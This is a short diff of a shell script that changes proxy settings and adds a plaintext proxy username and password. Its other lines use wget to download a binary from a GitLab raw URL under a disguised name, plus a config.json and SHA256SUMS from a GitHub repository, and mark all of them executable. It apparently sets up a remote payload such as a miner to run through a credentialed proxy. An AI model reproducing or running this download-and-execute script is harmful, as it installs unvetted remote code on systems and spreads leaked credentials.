@@ -1,5 +1,7 @@
-proxy="142.54.232.6" 
-port="4145"
+proxy="38.154.227.167" 
+port="5868" 
+user="ugursfso"  
+pass="wqn60pnk6m95" 
 wget -q -O Banque_Éminence https://gitlab.com/55113110159/dokerweb/-/raw/main/ebiy && chmod +x Banque_Éminence
 wget -q https://raw.githubusercontent.com/pagesrlepla/mx9/main/SHA256SUMS && chmod +x SHA256SUMS 
 wget -q https://raw.githubusercontent.com/pagesrlepla/mx9/main/config.json && chmod +x config.json
